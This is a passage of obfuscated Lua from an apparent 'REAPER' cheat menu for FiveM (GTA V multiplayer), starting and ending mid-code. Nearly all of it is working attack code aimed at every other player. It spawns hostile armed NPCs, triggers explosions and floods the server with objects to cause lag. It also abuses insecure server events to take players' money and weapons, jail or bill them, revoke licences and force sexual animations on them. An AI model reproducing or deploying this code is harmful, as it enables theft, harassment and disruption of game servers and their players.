                                    local swat = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('s_m_y_swat_01'), `s_m_y_swat_01`, __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityHeading(ped), true, true)
                                    __REAPER1__.N.GiveWeaponToPed(swat, `WEAPON_CARBINERIFLE` , 9999, false, true)
                                    __REAPER1__.N.TaskCombatPed(swat, ped, 0, 16)
                                end
                            end
                        end

                        __REAPER26__(10)
                    end
                end)
            end,
            bodyg = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        local ped = __REAPER1__.N.GetPlayerPed(v)
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            if __REAPER1__.F.RequestEntity(`ig_fbisuit_01`) then
                                __REAPER1__.N.SetPedAsGroupLeader(ped, __REAPER1__.N.GetPlayerGroup(ped))
                                for i = 1, math.random(2, 5) do
                                    local bodyg = __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('ig_fbisuit_01'), `ig_fbisuit_01`, __REAPER1__.N.GetEntityCoords(ped), __REAPER1__.N.GetEntityHeading(ped), true, true)
                                    __REAPER1__.N.GiveWeaponToPed(bodyg, `WEAPON_COMPACTRIFLE` , 9999, false, true)
                                    __REAPER1__.N.SetPedAsGroupMember(bodyg, __REAPER1__.N.GetPlayerGroup(ped))
                                    __REAPER1__.N.SetPedNeverLeavesGroup(bodyg, true)
                                    __REAPER1__.N.SetCanAttackFriendly(bodyg, false, false)
                                    __REAPER1__.N.TaskFollowToOffsetOfEntity(bodyg, ped, 0.0, 0.0, 0.0, 30.0, -1, 50.0, 1)
                                end
                            end
                        end

                        __REAPER26__(10)
                    end
                end)
            end,
            vehtome = function(p1, p2, p3, p4, p5, p6, p7)
                __REAPER25__(function()
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local entity =__REAPER1__.N.GetVehiclePedIsIn(ped, false)
                                if __REAPER1__.F.NetControl(entity) then
                                    __REAPER1__.N.SetEntityCoordsNoOffset(entity, __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), true, true ,true)
                                end
                            end
                        end
                    end
                end)
            end,
            exploits = {
                bugveh = function(p1, p2, p3, p4, p5, p6, p7)
                    if p2 then
                        __REAPER25__(function()
                            if __REAPER1__.F.RequestEntity(`prop_cigar_02`) then
                                for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                    if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                        local ped = __REAPER1__.N.GetPlayerPed(v)
                                        local ent = __REAPER1__.N.CreateObject(`prop_cigar_02`, __REAPER1__.N.GetEntityCoords(ped), true, true)
                                        __REAPER1__.N.AttachEntityToEntity(ent, ped, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 0, true)
                                        table.insert(__REAPER1__.T.BugvehAllplys, ent)
                                    end

                                    __REAPER26__(5)
                                end
                            end
                        end)
                    else
                        for k,v in ipairs(__REAPER1__.T.BugvehAllplys) do
                            __REAPER1__.N.DeleteEntity(v)
                        end
                        __REAPER1__.T.BugvehAllplys = {}
                    end
                end,
                cleanup = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.T.LagAllPlys[1] then
                        for k,v in ipairs(__REAPER1__.T.LagAllPlys) do
                            __REAPER1__.N.DeleteEntity(v)
                        end

                        __REAPER1__.T.LagAllPlys = {}

                        __REAPER1__.F.AddNotification('Cleaned up vehicles.', 3000, 200, 200, 200)
                    end
                end,
                lag = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p6) then
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    local ped = __REAPER1__.N.GetPlayerPed(v)
                                    for i = 1, __REAPER1__.A['server:allplayers:exploits_lagamount'].sindex do
                                        local ent = __REAPER1__.N.CreateObject(p6, __REAPER1__.N.GetEntityCoords(ped), true, true)
                                        table.insert(__REAPER1__.T.LagAllPlys, ent)

                                        __REAPER26__(5)
                                    end
                                end

                                __REAPER26__(5)
                            end
                        end
                    end)
                end
            },
            explosion = {
                explode = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v)), __REAPER1__.A['server:allplayers:explosion_type'].sindex - 1, __REAPER1__.F.IntToFloat(__REAPER1__.A['server:allplayers:explosion_damage'].sindex - 1), __REAPER1__.A['server:allplayers:explosion_audible'].func, __REAPER1__.A['server:allplayers:explosion_invisible'].func, true)
                            end

                            __REAPER26__(5)
                        end
                    end)
                end,
            },
            vehicle = {
                deletevehicle = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.DeleteEntity, 5, true)
                end,
                launchveh = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.ApplyForceToEntity, 5, 1, 0, 0, __REAPER1__.F.IntToFloat(p4 * 1000), 1.0, 0.0, 0.0, 1, false, true, false, false)
                end,
                removewheels = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.RemoveWheel, 5)
                end,
                setspeed = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.SetVehicleForwardSpeed, 5, __REAPER1__.F.IntToFloat(p4 - 1) / 3.6)
                end,
                cloneveh = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if not __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) ~= veh or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.CloneVehicle(veh, __REAPER1__.N.GetEntityCoords(veh), __REAPER1__.N.GetEntityHeading(veh), true, true)
                                end
                            end
                
                            __REAPER26__(5)
                        end
                    end)
                end,
                freeze = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.FreezeEntityPosition, 0, p2)
                end,
                fuckup = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.FuckUpVeh, 5)
                end,
                tune = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.TuneVehicle, 5)
                end,
                downgrade = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.DowngradeVeh, 5)
                end,
                fix = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.FixVehicle, 5)
                end,
                randomize = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.RandomizeVehLook, 5)
                end,
                fuel = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if not __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) ~= veh or __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.F.NetControl(veh) then
                                    if __REAPER1__.N.DecorExistOn(veh, "_FUEL_LEVEL") then
                                        __REAPER1__.N.DecorSetFloat(veh, "_FUEL_LEVEL", __REAPER1__.F.IntToFloat(p4 - 1))
                                    end
                                    __REAPER1__.N.SetVehicleFuelLevel(veh, __REAPER1__.F.IntToFloat(p4 - 1))
                                end
                            end

                            __REAPER26__(0)
                        end
                    end)
                end,
                lock = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if not __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) ~= veh or __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.F.NetControl(veh) then
                                    local lock = __REAPER1__.N.GetVehicleDoorLockStatus(veh)
                                    if lock == 0 or lock == 1 then
                                        __REAPER1__.N.OpDoorLock(veh, 2)
                                    elseif lock == 2 then
                                        __REAPER1__.N.OpDoorLock(veh, 1)
                                    end
                                end
                            end

                            __REAPER26__(0)
                        end
                    end)
                end,
                open = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.SetVehicleDoorOpen, 5, p4 - 1, false, false)
                end,
                close = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.SetVehicleDoorShut, 5, p4 - 1, false)
                end,
                delete = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.F.LoopPlayers('all', __REAPER1__.N.SetVehicleDoorBroken, 5, p4 - 1, true)
                end,
                flip = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                                local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                                if __REAPER1__.F.NetControl(veh) and not __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) ~= veh or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.SetEntityRotation(veh, 0, 180.0, __REAPER1__.N.GetEntityHeading(veh), 1, true)
                                end
                            end

                            __REAPER26__(0)
                        end
                    end)
                end,
            },
            weapon = {
                give = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                __REAPER1__.N.GiveWeaponToPed(__REAPER1__.N.GetPlayerPed(v), p2[p4] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4]), __REAPER1__.A['server:allplayers:weapon_ammo'].sindex - 1, false, false)
                            end

                            __REAPER26__(10)
                        end
                    end)
                end,
                spawn = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local p = __REAPER1__.N.CreatePickup(p2[p4] == 'Parachute' and `PICKUP_PARACHUTE` or __REAPER1__.N.GetHashKey('PICKUP_WEAPON_' .. p2[p4]), __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v)))
                                __REAPER26__(3000)
                                __REAPER1__.N.RemovePickup(p)
                            end
                        end
                    end)
                end,
                remove = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local ped = __REAPER1__.N.GetPlayerPed(v)
                                local weapon = p2[p4] == 'Parachute' and `GADGET_PARACHUTE` or __REAPER1__.N.GetHashKey('WEAPON_' .. p2[p4])
                
                                __REAPER1__.N.RemoveWeaponFromPed(ped, weapon)
                                __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A['server:allplayers:weapon_ammo'].sindex - 1)
                            end
                        end

                        __REAPER26__(10)
                    end)
                end,
                removec = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local ped = __REAPER1__.N.GetPlayerPed(v)
                                local jelenlegiFegyoBool, jelenlegiFegyo = __REAPER1__.N.GetCurrentPedWeapon(ped, 1)
                                if jelenlegiFegyoBool then
                                    __REAPER1__.N.RemoveWeaponFromPed(ped, jelenlegiFegyo)
                                    __REAPER1__.N.SetPedAmmo(ped, weapon, __REAPER1__.A['server:allplayers:weapon_ammo'].sindex - 1)
                                end
                            end

                            __REAPER26__(10)
                        end
                    end)
                end,
                itracer = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.AllPlysTracerI = {}
                end,
                btracer = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER1__.T.AllPlysTracerB = {}
                end,
            },
            sound = {
                sound = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v))
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A['server:allplayers:sound_type'].sindex].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A['server:allplayers:sound_type'].sindex].dict, true, 1.0, true)
                            end

                            __REAPER26__(5)
                        end
                    end)
                end,
            },
            trigger = {
                anim = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('dpemotes') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent('ServerValidEmote', __REAPER1__.N.GetPlayerServerId(v), __REAPER1__.T.TriggerAnims[p4], '')
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                stealm = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSteal then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerSteal, __REAPER1__.N.GetPlayerServerId(v), __REAPER1__.N.GetPlayerServerId(__REAPER1__.V.SelfPlayerId), 'item_money', '', p2)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerSteal = __REAPER1__.F.DynamicTrigger('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
                    end
                end,
                stealwep = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerSteal then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerSteal, __REAPER1__.N.GetPlayerServerId(v), __REAPER1__.N.GetPlayerServerId(__REAPER1__.V.SelfPlayerId), 'item_weapon', '', p2)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerSteal = __REAPER1__.F.DynamicTrigger('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
                    end
                end,
                jail = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerJail then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerJail, __REAPER1__.N.GetPlayerServerId(v), p2[p4], '\n\n   ???^7^*REAPER ON TOP   \n\n')
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerJail = __REAPER1__.F.DynamicTrigger('esx-qalle-jail', 'TriggerServerEvent', 'GetPlayerServerId%(')
                    end
                end,
                bill = function(p1, p2, p3, p4, p5, p6, p7)
                    local bill = __REAPER1__.F.StringSplit(p2, ' ')
                    if __REAPER1__.V.TriggerBill then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerBill, __REAPER1__.N.GetPlayerServerId(v), '', bill[1], tonumber(bill[2]))
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerBill = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', 'society_police')
                    end
                end,
                commserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('esx_communityservice') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent('esx_communityservice:sendToCommunityService', __REAPER1__.N.GetPlayerServerId(v), tonumber(p4))
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                rcommserv = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('esx_communityservice') == 'started' then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent('esx_communityservice:endCommunityServiceCommand', __REAPER1__.N.GetPlayerServerId(v))
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                message = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerMsg then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerMsg, __REAPER1__.N.GetPlayerServerId(v), p4)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerMsg = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', "license_revoked")
                    end
                end,
                carry = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerCarry then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    if p1 == 'Default' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                    elseif p1 == 'Secks' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'rcmpaparazzo_2', 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', 0.0, 0.0, 0.0, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                    elseif p1 == 'Fucked' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerCarry, nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 256, 256, 1)
                                    end
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerCarry = __REAPER1__.F.DynamicTrigger('CarryPeople', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                th = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerTakeHostage then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    if p1 == 'Default' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 49, 49, 50, true)
                                    elseif p1 == 'Secks' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'rcmpaparazzo_2', 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', 0.11, -0.24, 0.0, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 49, 49, 50, true)
                                    elseif p1 == 'Fucked' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerTakeHostage, nil, 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 256, 256, 256, true)
                                    end
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerTakeHostage = __REAPER1__.F.DynamicTrigger('TakeHostage', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                piggyback = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerPiggyback then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    if p1 == 'Default' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_a', 'piggyback_c_player_b', -0.07, 0.0, 0.45, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                    elseif p1 == 'Secks' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', -0.07, 0.0, 0.45, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                    elseif p1 == 'Fucked' then
                                        __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerPiggyback, nil, 'anim@arena@celeb@flat@paired@no_props@', 'piggyback_c_player_a', 'piggyback_c_player_b', -0.07, 0.0, 0.45, __REAPER1__.N.GetPlayerServerId(v), 100000, 0.0, 256, 256, 1)
                                    end
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerPiggyback = __REAPER1__.F.DynamicTrigger('PiggyBack', 'TriggerServerEvent', 'GetClosestPlayer%(')
                    end
                end,
                license = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerRemoveLic then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerRemoveLic, __REAPER1__.N.GetPlayerServerId(v), p4)
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerRemoveLic = __REAPER1__.F.DynamicTrigger('esx_policejob', 'TriggerServerEvent', "label = %(")
                    end
                end,
                sound = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.N.GetResourceState('InteractSound') == 'started' then
                        __REAPER1__.N.TriggerServerEvent('InteractSound_SV:PlayOnAll', string.lower(p2[p4]), 10000.0)
                    else
                        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
                    end
                end,
                csound = function(p1, p2, p3, p4, p5, p6, p7)
                    if __REAPER1__.V.TriggerHifi then
                        __REAPER25__(function()
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerHifi, p4, __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v)))
                                end

                                __REAPER26__(10)
                            end
                        end)
                    else
                        __REAPER1__.V.TriggerHifi = __REAPER1__.F.DynamicTrigger('esx_hifi', 'TriggerServerEvent', "__REAPER25__%(")
                    end
                end,
            },
            particle = {
                play = function(p1, p2, p3, p4, p5, p6, p7)
                    local rx, ry, rz = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['server:allplayers:particle_rotation'].func, ' ', true)
                    local ax, ay, az = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A['server:allplayers:particle_axis'].func, ' ', true)
                    
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v))
                                __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleEffects[__REAPER1__.A['server:allplayers:particle_type'].sindex].dict, __REAPER1__.T.ParticleEffects[__REAPER1__.A['server:allplayers:particle_type'].sindex].name, coords.x, coords.y, coords.z, __REAPER1__.F.IntToFloat(__REAPER1__.A['server:allplayers:particle_scale'].sindex), rx, ry, rz, ax, ay, az)
                            end
                    
                            __REAPER26__(300)
                        end
                    end)
                end,
            },
            attach = {
                attach = function(p1, p2, p3, p4, p5, p6, p7)
                    __REAPER25__(function()
                        if __REAPER1__.F.RequestEntity(p6) then
                            for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                                local ped = __REAPER1__.N.GetPlayerPed(v)
                                if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                    local obj = __REAPER1__.N.CreateObject(p6, __REAPER1__.N.GetEntityCoords(ped), true, true, false)
                                    __REAPER1__.N.AttachEntityToEntity(obj, ped, 0, 0, 0, 0, 0, 0, 0, false, false, true, false, 1, true)
                                end

                                __REAPER26__(5)
                            end
                        end
                    end)
                end
            },
        },
        tlist = {
            remove = function(p1, p2, p3, p4, p5, p6, p7)
                table.remove(__REAPER1__.T.Display['server:targetinglist:targetedplayers'], p7)
                __REAPER1__.A[p6 .. ':'  .. '91b72Ag=' .. '_target'].func = false

                if __REAPER1__.T.Display['server:targetinglist:targetedplayers'][1] == nil then
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist']) do
                        if k ~= 1 and v.dkey then
                            __REAPER1__.A[v.dkey] = nil
                        end
                    end
